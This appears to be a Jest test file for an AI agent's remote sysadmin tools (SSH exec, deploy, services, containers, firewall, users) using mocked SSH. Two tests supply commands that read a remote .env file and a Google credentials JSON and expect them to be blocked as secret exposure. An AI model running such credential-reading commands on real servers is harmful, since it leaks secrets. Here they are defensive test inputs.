      const result = await executeTool('ssh_exec', { server: 'production', command: 'echo hello' });
      expect(result).toBe('hello world');
    });

    it('returns exit code on failure', async () => {
      mockResolveProfile.mockReturnValue({ host: 'test.example.com', user: 'deploy' });
      mockSshExec.mockResolvedValue({ stdout: '', stderr: 'not found', exitCode: 127, error: 'bash: foo: command not found' });
      const result = await executeTool('ssh_exec', { server: 'production', command: 'foo' });
    ...
    it('handles destructive command cancellation', async () => {
      ...
      const { confirm } = require('../cli/safety');
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool('ssh_exec', { server: 'production', command: 'rm -rf /tmp/old' }, { autoConfirm: false });
      expect(result).toContain('CANCELLED');
    });
    ...
    it('blocks grep of .env file on remote host', async () => {
      mockResolveProfile.mockReturnValue({ host: 'test.example.com', user: 'deploy' });
      const result = await executeTool('ssh_exec', { server: 'production', command: 'grep -i "GOOGLE" /home/jarvis/remote-service/.env' });
      expect(result).toContain('BLOCKED');
    ...
    it('blocks cat of credentials file on remote host', async () => {
      mockResolveProfile.mockReturnValue({ host: 'test.example.com', user: 'deploy' });
      const result = await executeTool('ssh_exec', { server: 'production', command: 'cat /home/jarvis/remote-service/credentials/google-credentials.json' });
      expect(result).toContain('BLOCKED');
      expect(result).toContain('SSH secret-exposure');
    });
  ...
  describe('ssh_upload with mocked SSH', () => {
    it('uploads file successfully', async () => {
      ...
      const result = await executeTool('ssh_upload', { server: 'production', local_path: '/tmp/test.txt', remote_path: '/tmp/test.txt' });
    ...
    it('handles upload cancellation', async () => {
      ...
      const { confirm } = require('../cli/safety');
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool('ssh_upload', { server: 'production', local_path: '/tmp/test.txt', remote_path: '/tmp/test.txt' }, { autoConfirm: false });
      expect(result).toContain('CANCELLED');
    });
  ...
  describe('ssh_download with mocked SSH', () => {
    it('downloads file successfully', async () => {
      mockResolveProfile.mockReturnValue({ host: 'test.example.com', user: 'deploy' });
      mockScpDownload.mockResolvedValue('Downloaded: /tmp/remote.txt -> /tmp/local.txt');
      const result = await executeTool('ssh_download', { server: 'production', remote_path: '/tmp/remote.txt', local_path: '/tmp/local.txt' });
  ...
  describe('service_manage with mocked SSH', () => {
    it('runs status on remote server', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'active (running)', stderr: '', exitCode: 0 });
      const result = await executeTool('service_manage', { service: 'nginx', action: 'status', server: 'server1' });
    ...
    it('runs restart on remote with confirmation', async () => {
      ...
      const result = await executeTool('service_manage', { service: 'nginx', action: 'restart', server: 'server1' });
      expect(result).toContain('OK');
    });

    it('handles service not found on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: '', stderr: 'Unit notfound.service not found', exitCode: 4 });
      const result = await executeTool('service_manage', { service: 'notfound', action: 'status', server: 'server1' });
      expect(result).toContain('ERROR');
      expect(result).toContain('not found');
    });
  });
  ...
  describe('service_logs with mocked SSH', () => {
    it('reads logs from remote server', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'Mar 19 nginx log line 1\nMar 19 nginx log line 2', stderr: '', exitCode: 0 });
      const result = await executeTool('service_logs', { service: 'nginx', server: 'server1', lines: 10 });
      expect(result).toContain('nginx log line');
    });

    it('handles remote log error', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: '', stderr: 'unit not found', exitCode: 1, error: 'Unit not loaded' });
      const result = await executeTool('service_logs', { service: 'nonexistent', server: 'server1' });
  ...
  describe('container_list with mocked SSH', () => {
    it('lists containers on remote server', async () => {
      mockResolveProfile.mockReturnValue({ host: 'docker1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'CONTAINER ID  NAMES  IMAGE  STATUS\nabc123  web  nginx  Up 2h', stderr: '', exitCode: 0 });
  ...
  describe('container_logs with mocked SSH', () => {
    it('reads logs from remote container', async () => {
      mockResolveProfile.mockReturnValue({ host: 'docker1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'container log output here', stderr: '', exitCode: 0 });
      const result = await executeTool('container_logs', { container: 'web', server: 'docker1' });
  ...
  describe('container_exec with mocked SSH', () => {
    it('runs command in remote container', async () => {
      mockResolveProfile.mockReturnValue({ host: 'docker1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'hello from container', stderr: '', exitCode: 0 });
      const result = await executeTool('container_exec', { container: 'web', command: 'echo hello', server: 'docker1' });
  ...
  describe('container_manage with mocked SSH', () => {
    it('stops remote container', async () => {
      ...
      const result = await executeTool('container_manage', { container: 'web', action: 'stop', server: 'docker1' });
      expect(result).toContain('web');
    });

    it('inspects remote container', async () => {
      mockResolveProfile.mockReturnValue({ host: 'docker1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: '{"Id":"abc","Name":"web"}', stderr: '', exitCode: 0 });
      const result = await executeTool('container_manage', { container: 'web', action: 'inspect', server: 'docker1' });
  ...
  describe('deploy with mocked SSH', () => {
    it('deploys via git pull on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'prod.example.com', user: 'deploy' });
      mockSshExec.mockResolvedValue({ stdout: 'Already up to date.', stderr: '', exitCode: 0 });
      const result = await executeTool('deploy', {
        server: 'production', remote_path: '/var/www/app', method: 'git',
      });
    ...
    it('deploy git dry run', async () => {
      mockResolveProfile.mockReturnValue({ host: 'prod.example.com', user: 'deploy' });
      const result = await executeTool('deploy', {
        server: 'production', remote_path: '/var/www/app', method: 'git', dry_run: true,
      });
    ...
    it('deploy git with branch', async () => {
      mockResolveProfile.mockReturnValue({ host: 'prod.example.com', user: 'deploy' });
      mockSshExec.mockResolvedValue({ stdout: 'Switched to branch main', stderr: '', exitCode: 0 });
      const result = await executeTool('deploy', {
        server: 'production', remote_path: '/var/www/app', method: 'git', branch: 'main',
      });
      expect(result).toContain('Deployed');
    });
    ...
    it('deploy git pull failure', async () => {
      mockResolveProfile.mockReturnValue({ host: 'prod.example.com', user: 'deploy' });
      mockSshExec.mockResolvedValue({ stdout: '', stderr: 'fatal: not a git repository', exitCode: 128, error: 'fatal: not a git repository' });
      const result = await executeTool('deploy', {
        server: 'production', remote_path: '/var/www/app', method: 'git',
      });
      expect(result).toContain('ERROR');
    ...
    it('deploy with deploy_script', async () => {
      ...
      const result = await executeTool('deploy', {
        server: 'production', remote_path: '/var/www/app', method: 'git', deploy_script: 'systemctl restart app',
      });
      expect(result).toContain('Deployed');
  ...
  describe('deployment_status with mocked SSH', () => {
    ...
    it('handles unreachable server', async () => {
      ...
      mockResolveProfile.mockReturnValue({ host: 'staging.example.com', user: 'deploy' });
      mockSshExec.mockResolvedValue({ stdout: '', stderr: 'Connection refused', exitCode: 1 });
      const result = await executeTool('deployment_status', {});
      expect(result).toContain('Deployment Status');
    });
    ...
    it('handles config not found', async () => {
      ...
      const result = await executeTool('deployment_status', { config: 'nonexistent' });
      expect(result).toContain('NOT FOUND');
    });
  });
  ...
  describe('sysadmin remote execution', () => {
    it('runs audit on remote server', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: '=== OS / KERNEL ===\nAlmaLinux 9', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'audit', server: 'server1' });
      expect(result).toContain('AlmaLinux');
    });

    it('runs disk_usage on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: '/dev/sda1  100G  50G  50G  50%', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'disk_usage', server: 'server1', path: '/' });
      expect(result).toContain('/dev/sda1');
    });

    it('runs process_list on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'USER PID %CPU %MEM\nroot 1 0.1 0.5', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'process_list', server: 'server1' });
      expect(result).toContain('root');
    });

    it('runs network_status on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'LISTEN  0.0.0.0:80  nginx', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'network_status', server: 'server1' });
      expect(result).toContain('nginx');
    });

    it('runs user_manage list on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'deploy uid=1000 gid=1000 shell=/bin/bash', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'user_manage', user_action: 'list', server: 'server1' });
      expect(result).toContain('deploy');
    });

    it('runs cron list on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: '0 3 * * * /usr/bin/backup.sh', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'cron', cron_action: 'list', server: 'server1' });
      expect(result).toContain('backup');
    });

    it('runs ssl_check on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'Days until expiry: 45', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'ssl_check', domain: 'example.com', server: 'server1' });
      expect(result).toContain('45');
    });

    it('runs log_tail on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'Mar 19 10:00:00 error: something', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'log_tail', path: '/var/log/syslog', server: 'server1' });
      expect(result).toContain('error');
    });

    it('runs find_large on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: '500M\t/var/log/big.log', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'find_large', server: 'server1' });
      expect(result).toContain('500M');
    });

    it('runs firewall status on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'running\npublic (active)', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'firewall', firewall_action: 'status', server: 'server1' });
      expect(result).toContain('running');
    });

    it('runs service status on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'nginx.service - active (running)', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'service', service_action: 'status', service_name: 'nginx', server: 'server1' });
      expect(result).toContain('active');
    });

    it('runs service list_failed on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'redis.service  loaded  failed', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'service', service_action: 'list_failed', server: 'server1' });
      expect(result).toContain('redis');
    });

    it('runs kill_process by pid on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'Sent SIGTERM to PID 12345', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'kill_process', pid: 12345, server: 'server1' });
      expect(result).toContain('SIGTERM');
    });

    it('runs kill_process by name on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: "Sent SIGTERM to all 'zombie' processes", stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'kill_process', process_name: 'zombie', server: 'server1' });
      expect(result).toContain('zombie');
    });

    it('runs journalctl on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'Mar 19 10:00:00 systemd[1]: Started', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'journalctl', unit: 'nginx', server: 'server1' });
    ...
    it('runs package list on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec
        .mockResolvedValueOnce({ stdout: '/usr/bin/dnf\ndnf', stderr: '', exitCode: 0 })
        .mockResolvedValueOnce({ stdout: 'nginx.x86_64  1.24.0  @appstream', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'package', package_action: 'list', server: 'server1' });
      expect(result).toContain('nginx');
    });

    it('runs service start on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'nginx started', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'service', service_action: 'start', service_name: 'nginx', server: 'server1' });
      expect(typeof result).toBe('string');
    });

    it('runs service stop on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'nginx.service stopped', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'service', service_action: 'stop', service_name: 'nginx', server: 'server1' });
      expect(result).toContain('nginx');
    });

    it('runs service restart on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'nginx active (running)', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'service', service_action: 'restart', service_name: 'nginx', server: 'server1' });
      expect(result).toContain('nginx');
    });
    ...
    it('runs service reload on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: '', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'service', service_action: 'reload', service_name: 'nginx', server: 'server1' });
      expect(result).toContain('service reload OK');
    });

    it('runs service enable on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'nginx.service enabled', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'service', service_action: 'enable', service_name: 'nginx', server: 'server1' });
      expect(result).toContain('nginx');
    });

    it('runs service disable on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'nginx.service disabled', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'service', service_action: 'disable', service_name: 'nginx', server: 'server1' });
      expect(result).toContain('nginx');
    });

    it('runs firewall allow on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'success', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'firewall', firewall_action: 'allow', port: '80/tcp', server: 'server1' });
      expect(typeof result).toBe('string');
    });
    ...
    it('runs firewall deny on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'success', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'firewall', firewall_action: 'deny', port: '8080/tcp', server: 'server1' });
      expect(typeof result).toBe('string');
    });
    ...
    it('runs firewall remove on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'success', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'firewall', firewall_action: 'remove', port: '80/tcp', server: 'server1' });
      expect(typeof result).toBe('string');
    });
    ...
    it('runs firewall reload on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'success', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'firewall', firewall_action: 'reload', server: 'server1' });
      expect(typeof result).toBe('string');
    });

    it('runs cron add on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'Cron entry added', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'cron', cron_action: 'add', schedule: '0 3 * * *', command: '/usr/bin/backup.sh', server: 'server1' });
      expect(result).toContain('Cron entry added');
    });

    it('runs cron remove on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'Matching cron entries removed', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'cron', cron_action: 'remove', command: 'backup', server: 'server1' });
      expect(result).toContain('removed');
    });

    it('runs user_manage create on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'User testuser created', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'user_manage', user_action: 'create', user: 'testuser', server: 'server1' });
      expect(result).toContain('testuser');
    });

    it('runs user_manage delete on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'User testuser deleted', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'user_manage', user_action: 'delete', user: 'testuser', server: 'server1' });
      expect(result).toContain('testuser');
    });

    it('runs user_manage add_ssh_key on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'SSH key added for testuser', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'user_manage', user_action: 'add_ssh_key', user: 'testuser', ssh_key: 'ssh-rsa AAAA...', server: 'server1' });
      expect(result).toContain('SSH key added');
    });

    it('runs user_manage info on remote', async () => {
      mockResolveProfile.mockReturnValue({ host: 'server1.example.com', user: 'root' });
      mockSshExec.mockResolvedValue({ stdout: 'uid=1000(deploy) gid=1000(deploy)', stderr: '', exitCode: 0 });
      const result = await executeTool('sysadmin', { action: 'user_manage', user_action: 'info', user: 'deploy', server: 'server1' });
      expect(result).toContain('deploy');
    });
  });
});
